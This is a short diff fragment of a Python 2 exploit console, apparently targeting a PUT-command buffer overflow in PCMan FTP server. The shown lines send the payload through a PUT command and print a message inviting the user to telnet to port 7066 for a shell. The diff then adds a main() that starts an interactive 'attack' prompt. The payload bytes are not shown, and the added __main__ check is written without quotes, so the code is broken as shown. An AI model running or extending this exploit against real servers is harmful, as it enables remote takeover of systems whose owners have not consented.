@@ -99,3 +99,8 @@ class pcmanPutOverflowMenu(cmd.Cmd):
     s.send("PUT " + payload)\
     s.close()
     print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
+def main():
+  pcmanputoverflowmenu = pcmanPutOverflowMenu()
+  pcmanputoverflowmenu.cmdloop("pdf-console attack(pcman_put_overflow)% ")
+if __name__ == __main__:
+  main()
